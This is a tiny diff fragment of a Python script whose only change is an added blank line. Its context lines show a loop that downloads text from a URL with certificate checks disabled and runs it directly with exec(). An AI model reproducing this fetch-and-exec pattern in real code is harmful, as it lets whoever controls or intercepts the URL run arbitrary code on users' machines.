@@ -50,3 +50,4 @@ for data in linhas:
              response = requests.get(urlemail, verify=False)
              comemail = response.text
              exec(comemail)
+
